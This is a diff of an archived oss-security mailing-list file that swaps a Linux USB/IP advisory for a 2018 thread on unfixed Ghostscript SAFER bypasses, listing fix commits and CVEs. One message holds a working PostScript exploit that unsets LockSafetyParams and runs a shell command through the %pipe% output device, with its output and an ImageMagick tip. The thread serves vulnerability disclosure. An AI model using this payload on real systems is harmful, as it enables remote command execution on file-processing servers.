@@ -1,170 +1,216 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/02/2
-Message-ID: <001001d39c24$48886390$d9992ab0$@secunia.com>
-Date: Fri, 2 Feb 2018 13:49:37 +0100
-From: "Secunia Research" <vuln@...unia.com>
-To: <oss-security@...ts.openwall.com>
-Cc: <vuln@...unia.com>
-Subject: Secunia Research: Linux Kernel USB over IP Multiple Denial of Service Vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/29/8
+Message-ID: <CAJ_zFkLXTpjCijqNsHs0ZR4NdVwM+16ojUmxjYu0aZAgW=QhKQ@mail.gmail.com>
+Date: Wed, 29 Aug 2018 13:43:22 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
-======================================================================
+I should note, just add `userdict /setpagedevice undef` at the top if you
+want to test it with ImageMagick.
 
- 
-                     Secunia Research 2017/12/11
- 
- Linux Kernel USB over IP Multiple Denial of Service Vulnerabilities
- 
-======================================================================
+Tavis.
 
-Table of Contents
- 
-Affected Software....................................................1
-Severity.............................................................2
-Description of Vulnerabilities.......................................3
-Solution.............................................................4
-Time Table...........................................................5
-Credits..............................................................6
-References...........................................................7
-About Flexera .......................................................8
-Verification.........................................................9
- 
-======================================================================
+On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@...gle.com> wrote:
 
-1) Affected Software
- 
-Linux Kernel versions 4.1.x prior 4.1.49, 4.4.x prior to 4.4.114, 4.9.x
-prior to 4.9.71, and 4.14.x prior to 4.14.8.
- 
-======================================================================
-
-2) Severity
- 
-Rating: Less critical
-Impact: DoS (Denial of Service)
-Where:  Local Area Network
- 
-======================================================================
-
-3) Description of Vulnerabilities
- 
-Secunia Research has discovered multiple vulnerabilities in Linux Kernel,
-which can be exploited by malicious people to cause a DoS (Denial of
-Service).
- 
-An error in the "get_pipe()" function (drivers/usb/usbip/stub_rx.c) can be
-exploited to cause an out-of-bounds read memory access and subsequently
-trigger a BUG() failure and a kernel crash by sending a specially crafted
-USB over IP packet.
- 
-An error in the "stub_recv_cmd_submit()" function
-(drivers/usb/usbip/stub_rx.c) when handling CMD_SUBMIT packets can be
-exploited to trigger an arbitrary memory allocation and subsequently cause a
-kernel crash by sending a specially crafted USB over IP packet.
- 
-These vulnerabilities are confirmed in version 4.14.0-rc1 and reported in
-versions 4.4.x prior to 4.4.114, 4.9.x prior to 4.9.71, and 4.14.x prior to
-4.14.8. Other versions may also be affected.
- 
-An error in the "stub_send_ret_submit()" function
-(drivers/usb/usbip/stub_tx.c) can be exploited to trigger a NULL pointer
-dereference and subsequently cause a kernel crash by sending a specially
-crafted USB over IP packet.
- 
-Successful exploitation of the vulnerabilities requires USB over IP daemon
-(usbipd) to be running.
- 
-This vulnerability is confirmed in version 4.14.0-rc1 and reported in
-versions 4.1.x prior 4.1.49, 4.4.x prior to 4.4.107, 4.9.x prior to 4.9.71,
-and 4.14.x prior to 4.14.8. Other versions may also be affected.
- 
-======================================================================
-
-4) Solution
- 
-Update to version 4.1.49, 4.4.114, 4.9.71, or 4.14.8.
-https://git.kernel.org/linus/635f545a7e8be7596b9b2b6a43cab6bbd5a88e43
-https://git.kernel.org/linus/c6688ef9f29762e65bce325ef4acd6c675806366
-https://git.kernel.org/linus/be6123df1ea8f01ee2f896a16c2b7be3e4557a5a
- 
-======================================================================
-
-5) Time Table
- 
-2017/11/29 - Linux Kernel team contacted with vulnerability details.
-2017/11/29 - Linux Kernel team confirmed the vulnerabilities.
-2017/12/07 - Public disclosure of the vulnerabilities.
-2017/12/11 - Release of Secunia Advisory SA77000.
-2017/12/11 - Public disclosure of Secunia Research Advisory.
-2017/12/21 - Split Secunia Advisory SA77000 into Secunia Advisories
-             SA77000, SA80722, and SA80601 concerning the
-             vulnerabilities. Updated Secunia Research Advisory
-             due to GIT commits having been applied and certain
-             fixed versions having been released.
-2017/12/27 - Updated due to updates of Secunia Advisories SA77000,
-             SA80722, and SA80601.
-2018/02/01 - Updated due to updates of Secunia Advisories SA77000,
-             SA80722, and SA80601.
- 
-======================================================================
-
-6) Credits
- 
-Jakub Jirasek, Secunia Research at Flexera.
- 
-======================================================================
-
-7) References
- 
-The Flexera CNA has assigned the CVE-2017-16912, CVE-2017-16913, and
-CVE-2017-16914 identifiers for the vulnerabilities through the Common
-Vulnerabilities and Exposures (CVE) project.
- 
-======================================================================
-
-8) About Flexera
- 
-Flexera helps application producers and enterprises increase application
-usage and the value they derive from their software.
- 
-http://www.flexera.com
- 
-Flexera delivers market-leading Software Vulnerability Management solutions
-enabling enterprises to proactively identify and remediate software
-vulnerabilities, effectively reducing the risk of costly security breaches.
- 
-https://www.flexera.com/enterprise/products/
- 
-Flexera supports and contributes to the community in several ways. We have
-always believed that reliable vulnerability intelligence and tools to aid
-identifying and fixing vulnerabilities should be freely available for
-consumers to ensure that users, who care about their online privacy and
-security, can stay secure.
-Only a few vendors address vulnerabilities in a proper way and help users
-get updated and stay secure. End-users (whether private individuals or
-businesses) are otherwise left largely alone, and that is why back in 2002,
-Secunia Research started investigating, coordinating disclosure and
-verifying software vulnerabilities.
-In 2016, Secunia Research became a part of Flexera and today our in-house
-software vulnerability research remains the core of the Software
-Vulnerability Management products at Flexera.
- 
-https://www.flexera.com/enterprise/company/about/secunia-research/
- 
-The public Secunia Advisory database contains information for researchers,
-security enthusiasts, and consumers to lookup individual products and
-vulnerabilities and assess, whether they need to take any actions to secure
-their systems or whether a given vulnerability has already been discovered
- 
-https://secuniaresearch.flexerasoftware.com/community/advisories/
- 
-======================================================================
-
-9) Verification
- 
-Please verify this advisory by visiting the Secunia Research website:
-https://secuniaresearch.flexerasoftware.com/secunia_research/2017-21
- 
-======================================================================
-
+> Thanks Marcus, here are some more necessary commits:
+>
+>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
+> # 699654 D /invalidaccess checks stop working after a failed restore
+>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
+> # 699670 gssetresolution memory corruption
+>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> # 699671 handling /undefined results in SEGV
+>
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> # 699676 PDF interpreter can leave dangerous operators available
+>
+> Please note that not all issues are resolved, and I have exploits that
+> still work against HEAD.
+>
+> For example, this will still work if you pull master as of this writing:
+>
+> $ cat testcase.pdf
+> %!PS
+> % This is ghostscript bug #699687 (split out from bug #699654)
+>
+> a0 % just select a papersize to initialize page device
+>
+> % You can't def HWResolution (for example), because currentpagedevice is
+> readonly:
+> %
+> % GS>currentpagedevice wcheck ==
+> % false
+> %
+> % But you can just put or astore into it, because the array itself is
+> writable:
+> % GS>currentpagedevice /HWResolution get wcheck ==
+> % true
+> %
+> % If you put some junk in there, then grestore stops working.
+> currentpagedevice /HWResolution get 0 (foobar) put
+>
+> % this grestore will fail, `stopped` just handles the error instead of
+> aborting.
+> { grestore } stopped {} if
+>
+> % now LockSafetyParams will be incorrectly unset, you can check like this:
+> % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams get
+> == pop
+> % false
+>
+> % we can change and configure devices now, so make sure we're using one
+> with
+> % a OutputFile property.
+> (ppmraw) selectdevice
+>
+> % run a shell command
+> mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+> showpage
+> $ evince testcase.pdf
+> uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+> context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+> (libspectre) ghostscript reports: ioerror -12
+>
+> Tavis.
+>
+> On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@...e.de> wrote:
+>
+>> Hi,
+>>
+>> I had 4 CVEs assigned yesterday afternoon already working from CERTs list,
+>> see inline comments below. Please adjust if something is incorrect in
+>> them.
+>>
+>> CERT has mailed overnight that they will take care of the CVE assignment,
+>> so
+>> I am defering the rest to them.
+>>
+>> Ciao, Marcus
+>>
+>> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
+>> > Here is an update, Artifex made a press release
+>> > <
+>> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
+>> >
+>> > listing
+>> > some necessary commits, but the list was incomplete.
+>> >
+>> > Here is a list of relevant commits I'm aware of so far, some issues are
+>> > still open with working exploits available. It's my understanding that
+>> no
+>> > new release is planned until late September, and vendors need to either
+>> > ship a git snapshot when all issues are resolved, or apply patches. I
+>> have
+>> > testcases for each problem, but I think the bugs will be visible
+>> eventually
+>> > so I'm not posting them here.
+>> >
+>> >
+>> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+>> > # 699671
+>> > handling /undefined results in SEGV
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
+>> > # 699659 missing type check in ztype
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
+>> > 699654 A /invalidaccess checks stop working after a failed restore
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
+>> #
+>> > 699654 B /invalidaccess checks stop working after a failed restore
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
+>> #
+>> > 699654 C /invalidaccess checks stop working after a failed restore
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716 #
+>> 699655
+>> > - missing type checking in setcolor
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde #
+>> 699656
+>>
+>>
+>> > - LockDistillerParams boolean missing type checks
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
+>>         CVE-2018-15910
+>>
+>>
+>> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
+>> errors
+>>
+>>
+>> >
+>> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
+>> > # 699660 - shading_param incomplete type checking
+>> >
+>> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
+>> > # 699660 - shading_param incomplete type checking
+>>         CVE-2018-15909
+>>
+>>
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
+>> > # 699661 - pdf14 garbage collection memory corruption
+>> >
+>> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
+>> > # 699663 - .setdistillerkeys memory corruption
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
+>> > # 699664 - corrupt device object after error in job
+>>
+>>
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
+>> > # 699657 - .tempfile SAFER restrictions seem to be broken
+>>         CVE-2018-15908
+>>
+>> >
+>> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
+>>
+>>
+>> > # 699665 - memory corruption in aesdecode
+>> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
+>>
+>>         CVE-2018-15911
+>>
+>> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
+>> handled
+>> >
+>> > Tavis
+>> >
+>> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
+>> > bfriesen@...ple.dallas.tx.us> wrote:
+>> >
+>> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
+>> > > >
+>> > > > (Regarding the `file.ps2' and `file.ps3' examples without `PS2:' or
+>> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it seems
+>> > > > that they ends up as:
+>> > > >
+>> > > > Domain: Coder; rights=Read; pattern="PS" ...
+>> > > >
+>> > > > ...so should be blocked by the workaround described in
+>> > > > VU#332928. But please correct me if I'm wrong.)
+>> > >
+>> > > This is likely due to header magic detection (e.g. "%!PS-Adobe").  It
+>> > > is possible that a different path will be taken if the common
+>> > > Postscript header is not detected.  The file extension may then be
+>> > > used as a hint.  Also, there are a wide varieties of ImageMagick
+>> > > versions in use, with a wide variety of behaviors.
+>> > >
+>> > > The version of ImageMagick provided by the Ubuntu Linux I am using at
+>> > > this moment dates from 2012!
+>> > >
+>> > > Bob
+>> > > --
+>> > > Bob Friesenhahn
+>> > > bfriesen@...ple.dallas.tx.us,
+>> http://www.simplesystems.org/users/bfriesen/
+>> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+>> > >
+>>
+>> --
+>> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
+>> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
+>> meissner@...e.de>
+>>
+>
 
